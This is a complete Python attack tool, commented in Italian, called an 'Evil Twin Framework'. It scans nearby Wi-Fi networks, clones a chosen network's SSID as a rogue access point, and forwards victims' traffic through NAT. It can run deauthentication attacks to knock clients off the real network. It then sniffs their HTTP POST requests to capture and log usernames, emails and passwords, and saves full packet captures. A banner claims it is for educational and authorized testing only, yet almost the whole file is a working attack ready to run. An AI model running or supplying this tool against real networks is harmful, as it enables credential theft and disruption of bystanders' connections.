#!/usr/bin/env python3
"""
EVIL TWIN FRAMEWORK 5.0 - ABSOLUTE FINAL
- Scansione automatica reti Wi-Fi
- Selezione target interattiva con fallback manuale
- Creazione AP falso con airbase-ng
- Internet passthrough (NAT + DHCP)
- Intercettazione HTTP live con estrazione credenziali
- Salvataggio PCAP completo
- Deauth attack opzionale
- Menu interattivo con statistiche e log
- Cleanup totale (processi, iptables, monitor mode, NetworkManager)

REQUISITI: 2 interfacce (1 Internet, 1 wireless con supporto master mode)
           scapy, aircrack-ng, dnsmasq, netifaces
"""

import os
import sys
import time
import signal
import subprocess
import threading
import re
import netifaces
import tempfile
import atexit
import glob
from datetime import datetime

# ------------------------- SCAPY (globale) -------------------------
try:
    from scapy.all import sniff, wrpcap, IP, TCP, Raw
    SCAPY_OK = True
except ImportError:
    print("\n[!] SCAPY NON INSTALLATO. ESEGUI:")
    print("    sudo apt install python3-scapy")
    print("    sudo pip3 install scapy")
    sys.exit(1)

# --------------------------- CONFIG -------------------------------
VERSION = "5.0 ABSOLUTE FINAL"
PCAP_DIR = "/tmp/eviltwin_captures"
LOG_FILE = "/tmp/eviltwin_credentials.log"
CAPTURE_FILE = f"{PCAP_DIR}/victim_traffic.pcap"
SAVE_PCAP = True
GATEWAY_IP = "10.0.0.1"
DHCP_START = "10.0.0.10"
DHCP_END = "10.0.0.100"
SCAN_TIME = 8

# --------------------------- GLOBALI ------------------------------
internet_iface = None
ap_iface = None
ap_iface_original = None
airbase_pid = None
dnsmasq_pid = None
sniffer_thread = None
at0 = "at0"
stop_sniffer = threading.Event()
cleanup_done = False

# --------------------------- UTILITY ------------------------------
def run_cmd(cmd, capture=True):
    """Esegue un comando shell e restituisce (stdout, stderr, rc)."""
    try:
        if capture:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        else:
            subprocess.run(cmd, shell=True)
            return "", "", 0
    except Exception:
        return "", "", -1

def check_root():
    if os.geteuid() != 0:
        print("\n[!] DEVI ESSERE ROOT. USA: sudo python3 evil_twin_absolute.py\n")
        sys.exit(1)

def check_dependencies():
    tools = ['airbase-ng', 'dnsmasq', 'airodump-ng', 'aireplay-ng']
    missing = []
    for t in tools:
        if run_cmd(f"which {t}")[2] != 0:
            missing.append(t)
    if missing:
        print(f"\n[!] MANCANO: {', '.join(missing)}")
        print("    INSTALLA: sudo apt install aircrack-ng dnsmasq")
        sys.exit(1)

def setup_directories():
    os.makedirs(PCAP_DIR, exist_ok=True)
    try:
        with open(LOG_FILE, 'w') as f:
            f.write(f"=== EVIL TWIN LOG {datetime.now().isoformat()} ===\n")
            f.write("TIMESTAMP | CLIENT MAC | CLIENT IP | HOST | POST DATA\n")
            f.write("-" * 80 + "\n")
    except:
        pass

def get_default_interface():
    g = netifaces.gateways()
    return g.get('default', {}).get(netifaces.AF_INET, [None, None])[1]

def check_internet(iface):
    print(f"[*] Verifica Internet su {iface}...", end=" ", flush=True)
    _, _, rc = run_cmd(f"ping -c 1 -W 2 -I {iface} 8.8.8.8")
    if rc == 0:
        print("✓")
        return True
    print("✗")
    return False

def enable_monitor(iface):
    global ap_iface_original
    ap_iface_original = iface
    print(f"[*] Abilito monitor mode su {iface}...", end=" ", flush=True)
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set monitor control")
    run_cmd(f"ip link set {iface} up")
    time.sleep(1)
    out, _, _ = run_cmd(f"iwconfig {iface} | grep -i mode")
    if 'monitor' in out.lower():
        print("✓")
        return True
    print("✗")
    return False

def disable_monitor(iface):
    print(f"[*] Ripristino {iface} in managed...", end=" ", flush=True)
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set type managed")
    run_cmd(f"ip link set {iface} up")
    print("✓")

# --------------------------- SCAN NETWORKS -------------------------
def scan_networks(iface, scan_time=SCAN_TIME):
    """Scansiona reti Wi-Fi con airodump-ng, restituisce lista di dict."""
    print(f"[*] Scansione reti su {iface} ({scan_time} sec)...")
    with tempfile.NamedTemporaryFile(suffix='.csv', delete=False) as tmp:
        csv_base = tmp.name[:-4]

    proc = subprocess.Popen(
        f"airodump-ng {iface} --output-format csv -w {csv_base} --write-interval 1",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(scan_time)
    proc.terminate()
    time.sleep(1)

    networks = []
    csv_files = glob.glob(f"{csv_base}-*.csv")
    if csv_files:
        try:
            with open(csv_files[0], 'r', errors='ignore') as f:
                lines = f.readlines()
            for line in lines:
                if line.startswith('BSSID') or 'Station' in line or not line.strip():
                    continue
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    if len(bssid) != 17:
                        continue
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    power = parts[5].strip() if len(parts) > 5 else '0'
                    enc = parts[6].strip() if len(parts) > 6 else ''
                    if essid and essid != '(not associated)':
                        if not any(n['bssid'] == bssid for n in networks):
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid,
                                'power': power,
                                'enc': enc
                            })
        except Exception as e:
            print(f"    [!] Errore parsing CSV: {e}")
        finally:
            for f in glob.glob(f"{csv_base}*"):
                try:
                    os.remove(f)
                except:
                    pass

    networks.sort(key=lambda x: int(x['power']) if x['power'].isdigit() else 0, reverse=True)
    return networks

# --------------------------- SELECT TARGET -------------------------
def select_target(networks):
    """Menu interattivo per la scelta del target con ripristino forzato del terminale."""
    import termios, tty

    def reset_stdin():
        """Ripristina la modalità canonica del terminale."""
        try:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, termios.tcgetattr(sys.stdin))
        except:
            pass

    print("\n" + "=" * 60)
    print("          RETI TROVATE - SELEZIONA TARGET")
    print("=" * 60)
    for idx, net in enumerate(networks, 1):
        power = net['power']
        bars = "▂▄▆█"[:min(4, max(1, (int(power) + 100) // 25))] if power.isdigit() else "?"
        print(f"{idx:2d}. [{bars:4}] {net['essid'][:30]:30} "
              f"CH:{net['channel']:>3}  {net['bssid']}  ({net['enc'] or 'OPEN'})")
    print("\n[0] Inserimento manuale (BSSID/canale)")
    print("[Q] Esci")

    # Ripristina il terminale prima di qualsiasi input
    reset_stdin()

    while True:
        try:
            sys.stdout.flush()
            scelta = input("\n[*] Scegli (numero/0/q): ").strip().lower()
            if scelta == 'q':
                print("[!] Uscita.")
                sys.exit(0)
            if scelta == '0':
                print("\n--- INSERIMENTO MANUALE ---")
                reset_stdin()
                bssid = input("BSSID (es. AA:BB:CC:DD:EE:FF): ").strip().upper()
                if not bssid or len(bssid) != 17:
                    print("[!] BSSID non valido.")
                    continue
                reset_stdin()
                channel = input("Canale: ").strip()
                if not channel.isdigit():
                    print("[!] Canale non valido.")
                    continue
                reset_stdin()
                essid = input("SSID (opzionale, default ManualTarget): ").strip()
                if not essid:
                    essid = "ManualTarget"
                return {
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid,
                    'power': '0',
                    'enc': 'MANUAL'
                }
            scelta_num = int(scelta)
            if 1 <= scelta_num <= len(networks):
                return networks[scelta_num - 1]
            else:
                print("[!] Numero fuori range.")
        except ValueError:
            print("[!] Inserisci un numero valido.")
        except KeyboardInterrupt:
            print("\n[!] Interrotto.")
            sys.exit(1)

# --------------------------- TRAFFIC INTERCEPTOR -------------------
class TrafficInterceptor:
    def __init__(self, interface=at0):
        self.interface = interface
        self.running = False
        self.stats = {
            'packets': 0,
            'http': 0,
            'creds': 0,
            'clients': set()
        }
        self.start_time = time.time()

    def get_mac_from_ip(self, ip):
        if ip.startswith('10.0.0.'):
            out, _, _ = run_cmd(f"arp -n {ip} | grep {ip}")
            m = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', out)
            return m.group(0) if m else 'N/A'
        return 'N/A'

    def packet_handler(self, pkt):
        try:
            self.stats['packets'] += 1
            if SAVE_PCAP:
                wrpcap(CAPTURE_FILE, pkt, append=True)

            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                ip = pkt.getlayer(IP)
                tcp = pkt.getlayer(TCP)
                if tcp.dport == 80 or tcp.sport == 80:
                    self.stats['http'] += 1
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    client_ip = ip.src if tcp.sport != 80 else ip.dst
                    client_mac = self.get_mac_from_ip(client_ip)
                    self.stats['clients'].add(client_mac)
                    if payload.startswith('POST'):
                        self.analyze_post(payload, client_ip, client_mac)
        except Exception:
            pass

    def analyze_post(self, payload, client_ip, client_mac):
        lines = payload.split('\n')
        host = ''
        for line in lines:
            if line.lower().startswith('host:'):
                host = line.split(':', 1)[1].strip()
                break
        post_data = lines[-1].strip() if lines[-1] and '=' in lines[-1] else ''
        if post_data:
            self.stats['creds'] += 1
            ts = datetime.now().isoformat()
            try:
                with open(LOG_FILE, 'a') as f:
                    f.write(f"{ts} | {client_mac} | {client_ip} | {host} | {post_data}\n")
            except:
                pass
            print(f"\n\033[91m╔══════════════════════════════════════════════════════════╗")
            print(f"║  🔐 CREDENZIALI CATTURATE!                               ║")
            print(f"╠══════════════════════════════════════════════════════════╣")
            print(f"║  Cliente: {client_mac} ({client_ip})")
            print(f"║  Target:  {host}")
            print(f"║  Data:    {post_data}")
            print(f"╚══════════════════════════════════════════════════════════╝\033[0m\n")
            self.extract_creds(post_data)

    def extract_creds(self, data):
        patterns = [
            (r'user[name]*[=:]([^&\s]+)', '👤 Username'),
            (r'login[name]*[=:]([^&\s]+)', '👤 Login'),
            (r'email[=:]([^&\s]+@[^&\s]+)', '📧 Email'),
            (r'pass(word)?[=:]([^&\s]+)', '🔑 Password'),
            (r'pwd[=:]([^&\s]+)', '🔑 Password')
        ]
        for pat, label in patterns:
            m = re.search(pat, data, re.IGNORECASE)
            if m:
                val = m.group(1) if len(m.groups()) == 1 else m.group(2)
                print(f"\033[93m     {label}: {val}\033[0m")

    def print_stats(self):
        elapsed = int(time.time() - self.start_time)
        print("\n" + "=" * 60)
        print(f"📊 STATISTICHE ({datetime.now().strftime('%H:%M:%S')})")
        print("=" * 60)
        print(f"   Pacchetti:      {self.stats['packets']}")
        print(f"   Richieste HTTP: {self.stats['http']}")
        print(f"   Credenziali:    {self.stats['creds']}")
        print(f"   Clienti unici:  {len(self.stats['clients'])}")
        print(f"   Tempo attivo:   {elapsed} sec")
        print(f"   PCAP:           {CAPTURE_FILE if SAVE_PCAP else 'no'}")
        print(f"   Log:            {LOG_FILE}")
        print("=" * 60)

    def start(self):
        self.running = True
        print(f"\n\033[92m[*] Sniffing HTTP su {self.interface}...\033[0m")
        print(f"[*] Log credenziali: {LOG_FILE}")
        if SAVE_PCAP:
            print(f"[*] Capture PCAP:    {CAPTURE_FILE}")
        print("[*] In attesa di vittime...\n")
        sniff(iface=self.interface, prn=self.packet_handler, store=False,
              stop_filter=lambda x: not self.running)

    def stop(self):
        self.running = False
        self.print_stats()

# --------------------------- EVIL TWIN CORE ------------------------
class EvilTwinCore:
    def __init__(self, internet_iface, ap_iface, target):
        self.internet_iface = internet_iface
        self.ap_iface = ap_iface
        self.target = target
        self.at0 = at0
        self.airbase_pid = None
        self.dnsmasq_pid = None

    def start_airbase(self):
        global airbase_pid
        ssid = self.target['essid']
        channel = self.target['channel']
        print(f"\n[*] Avvio AP falso (SSID: '{ssid}', CH: {channel})...")
        proc = subprocess.Popen(
            f"airbase-ng -e '{ssid}' -c {channel} {self.ap_iface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.airbase_pid = proc.pid
        airbase_pid = proc.pid
        print(f"    [✓] airbase-ng avviato (PID: {self.airbase_pid})")
        for _ in range(10):
            time.sleep(1)
            if os.path.exists(f"/sys/class/net/{self.at0}"):
                print(f"    [✓] Interfaccia {self.at0} creata")
                return True
        print("    [✗] Interfaccia at0 non creata!")
        return False

    def configure_network(self):
        print("\n[*] Configurazione rete...")
        run_cmd(f"ifconfig {self.at0} up")
        run_cmd(f"ifconfig {self.at0} {GATEWAY_IP} netmask 255.255.255.0")
        run_cmd(f"route add -net 10.0.0.0 netmask 255.255.255.0 gw {GATEWAY_IP}")
        print(f"    [✓] IP {GATEWAY_IP} su {self.at0}")

        run_cmd("sysctl -w net.ipv4.ip_forward=1")
        print("    [✓] IP forwarding abilitato")

        # Rimuovi regole vecchie (ignora errori)
        run_cmd(f"iptables -t nat -D POSTROUTING -o {self.internet_iface} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.at0} -o {self.internet_iface} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.internet_iface} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")

        # Aggiungi regole nuove
        run_cmd(f"iptables -t nat -A POSTROUTING -o {self.internet_iface} -j MASQUERADE")
        run_cmd(f"iptables -A FORWARD -i {self.at0} -o {self.internet_iface} -j ACCEPT")
        run_cmd(f"iptables -A FORWARD -i {self.internet_iface} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT")
        run_cmd("iptables -P FORWARD ACCEPT")
        print("    [✓] iptables configurati (NAT)")

    def start_dnsmasq(self):
        global dnsmasq_pid
        print("\n[*] Avvio dnsmasq (DHCP+DNS)...")
        conf_file = "/tmp/eviltwin_dnsmasq.conf"
        try:
            with open(conf_file, "w") as f:
                f.write(f"""interface={self.at0}
dhcp-range={DHCP_START},{DHCP_END},12h
dhcp-option=3,{GATEWAY_IP}
dhcp-option=6,8.8.8.8
no-resolv
log-queries
log-dhcp
""")
        except:
            print("    [✗] Errore scrittura configurazione dnsmasq")
            return False

        run_cmd("pkill -f 'dnsmasq.*at0' 2>/dev/null")
        proc = subprocess.Popen(
            f"dnsmasq -C {conf_file} -d",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.dnsmasq_pid = proc.pid
        dnsmasq_pid = proc.pid
        print(f"    [✓] dnsmasq avviato (PID: {self.dnsmasq_pid})")
        return True

    def deauth_attack(self, bssid=None, client=None):
        if not bssid:
            bssid = self.target['bssid']
        print(f"\n[*] Deauth attack su {bssid}...")
        cmd = f"aireplay-ng --deauth 0 -a {bssid} {self.ap_iface}"
        if client:
            cmd += f" -c {client}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("    [✓] Deauth avviato (background)")

# --------------------------- CLEANUP -------------------------------
def cleanup():
    global cleanup_done, airbase_pid, dnsmasq_pid, sniffer_thread, stop_sniffer
    if cleanup_done:
        return
    print("\n\n[*] PULIZIA COMPLETA IN CORSO...")

    stop_sniffer.set()
    if sniffer_thread and sniffer_thread.is_alive():
        sniffer_thread.join(timeout=2)

    if airbase_pid:
        run_cmd(f"kill -9 {airbase_pid} 2>/dev/null")
    if dnsmasq_pid:
        run_cmd(f"kill -9 {dnsmasq_pid} 2>/dev/null")
    time.sleep(1)

    if internet_iface:
        run_cmd(f"iptables -t nat -D POSTROUTING -o {internet_iface} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {at0} -o {internet_iface} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {internet_iface} -o {at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")

    run_cmd("sysctl -w net.ipv4.ip_forward=0")

    if ap_iface_original:
        disable_monitor(ap_iface_original)

    run_cmd(f"ip link set {at0} down 2>/dev/null")
    run_cmd(f"iw dev {at0} del 2>/dev/null")

    run_cmd("systemctl restart NetworkManager 2>/dev/null")
    run_cmd("rfkill unblock wifi")

    print("\033[92m[✓] PULIZIA COMPLETATA. SISTEMA RIPRISTINATO.\033[0m")
    print(f"\n📁 Log credenziali: {LOG_FILE}")
    if SAVE_PCAP and os.path.exists(CAPTURE_FILE):
        size = os.path.getsize(CAPTURE_FILE) // 1024
        print(f"📁 Capture PCAP:    {CAPTURE_FILE} ({size} KB)")
    cleanup_done = True

def signal_handler(sig, frame):
    print("\n\n[!] INTERROTTO DALL'UTENTE")
    cleanup()
    sys.exit(0)

# --------------------------- MAIN ---------------------------------
def main():
    global internet_iface, ap_iface, sniffer_thread, stop_sniffer

    print(f"""
\033[92m
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
║     ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
║     █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
║     ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
║     ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
║                                                               ║
║              EVIL TWIN FRAMEWORK {VERSION}                     ║
║         Professional Wireless Penetration Testing Tool        ║
║                                                               ║
║     ⚠️  SOLO USO EDUCATIVO E TEST AUTORIZZATI ⚠️              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
\033[0m""")

    check_root()
    check_dependencies()
    setup_directories()

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # ---- SELEZIONE INTERFACCIA INTERNET ----
    default = get_default_interface()
    if default:
        print(f"\n[+] Interfaccia con Internet rilevata: {default}")
        resp = input("Usare questa per Internet? (S/n): ").strip().lower()
        if resp == 'n':
            internet_iface = input("Inserisci nome interfaccia Internet: ").strip()
        else:
            internet_iface = default
    else:
        print("[!] Nessuna route predefinita trovata.")
        internet_iface = input("Inserisci nome interfaccia Internet (es. eth0): ").strip()

    if internet_iface not in netifaces.interfaces():
        print(f"[!] Interfaccia {internet_iface} non esiste.")
        sys.exit(1)

    if not check_internet(internet_iface):
        print("[!] L'interfaccia non ha connettività Internet.")
        sys.exit(1)

    # ---- SELEZIONE INTERFACCIA AP ----
    out, _, _ = run_cmd("iw dev | grep Interface | awk '{print $2}'")
    wlans = out.splitlines()
    if not wlans:
        print("[!] Nessuna interfaccia wireless trovata.")
        sys.exit(1)

    print("\n--- INTERFACCE WIRELESS DISPONIBILI ---")
    for i, w in enumerate(wlans, 1):
        note = " (IN USO PER INTERNET)" if w == internet_iface else ""
        print(f"  {i}. {w}{note}")

    try:
        idx = int(input("\nScegli interfaccia per AP falso (numero): "))
        ap_iface = wlans[idx - 1]
    except (ValueError, IndexError):
        print("[!] Scelta non valida.")
        sys.exit(1)

    if ap_iface == internet_iface:
        warn = input("[!] Stessa interfaccia per Internet e AP. Continuare? (s/N): ")
        if warn.lower() != 's':
            sys.exit(0)

    # ---- SCANSIONE TARGET ----
    if not enable_monitor(ap_iface):
        sys.exit(1)

    networks = scan_networks(ap_iface)
    if not networks:
        print("[!] Nessuna rete trovata.")
        disable_monitor(ap_iface)
        sys.exit(1)

    target = select_target(networks)
    print(f"\n\033[92m[✓] TARGET: {target['essid']} ({target['bssid']})\033[0m")

    # ---- AVVIO EVIL TWIN ----
    twin = EvilTwinCore(internet_iface, ap_iface, target)

    if not twin.start_airbase():
        cleanup()
        sys.exit(1)

    twin.configure_network()
    twin.start_dnsmasq()

    print(f"\n\033[92m[✓] EVIL TWIN ATTIVO: '{target['essid']}' (CH {target['channel']})\033[0m")
    print(f"    Gateway: {GATEWAY_IP}   DHCP: {DHCP_START}-{DHCP_END}   DNS: 8.8.8.8\n")

    # ---- DEAUTH OPZIONALE ----
    deauth = input("Eseguire deauth attack? (s/N): ").strip().lower()
    if deauth == 's':
        client = input("Client specifico? (MAC / INVIO per broadcast): ").strip()
        twin.deauth_attack(client=client if client else None)

    # ---- AVVIO SNIFFER ----
    stop_sniffer.clear()
    interceptor = TrafficInterceptor(at0)
    sniffer_thread = threading.Thread(target=interceptor.start, daemon=True)
    sniffer_thread.start()

    # ---- MENU INTERATTIVO ----
    print("\n\033[93m" + "=" * 60)
    print("          🎯 MODALITÀ INTERCETTAZIONE ATTIVA 🎯")
    print("=" * 60)
    print("   [1] Mostra statistiche")
    print("   [2] Mostra ultime credenziali")
    print("   [3] Apri log file")
    print("   [4] Riavvia deauth")
    print("   [5] Ferma attacco e pulisci")
    print("=" * 60 + "\033[0m")

    try:
        while True:
            cmd = input("evil-twin> ").strip()
            if cmd == '1':
                interceptor.print_stats()
            elif cmd == '2':
                print("\n--- ULTIME 20 CREDENZIALI ---")
                run_cmd(f"tail -20 {LOG_FILE}")
            elif cmd == '3':
                os.system(f"less {LOG_FILE}")
            elif cmd == '4':
                twin.deauth_attack()
            elif cmd == '5':
                break
            elif cmd == '':
                continue
            else:
                print("[!] Comando non riconosciuto.")
    except KeyboardInterrupt:
        pass

    cleanup()
    print("[✓] Uscita.")

if __name__ == "__main__":
    main()